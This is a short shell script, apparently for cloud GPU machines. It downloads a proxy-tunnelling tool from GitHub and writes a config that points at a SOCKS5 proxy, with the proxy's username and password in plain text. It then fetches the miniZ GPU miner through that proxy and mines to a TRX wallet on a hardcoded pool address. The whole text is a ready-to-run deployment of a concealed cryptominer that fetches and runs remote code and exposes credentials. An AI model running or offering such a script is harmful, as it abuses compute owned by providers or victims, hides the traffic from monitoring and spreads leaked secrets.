sudo apt-get update -y
wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.140.13.119:9132

socks5_username = nifmedhm

socks5_password = zk5tie29hzg9

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y2/miniZ_v1.8y2_linux-x64.tar.gz 
tar xf miniZ_v1.8y2_linux-x64.tar.gz 

chmod +x miniZ

./graftcp/graftcp ./miniZ -u TRX:TL9Zj9rC4jbBDcGHq7H2xNJQw34VrgtBJs.$(echo $(shuf -i 1-999 -n 1)-T4) -l 159.203.163.51 --port=3333 -p x --par=ethash --pers auto
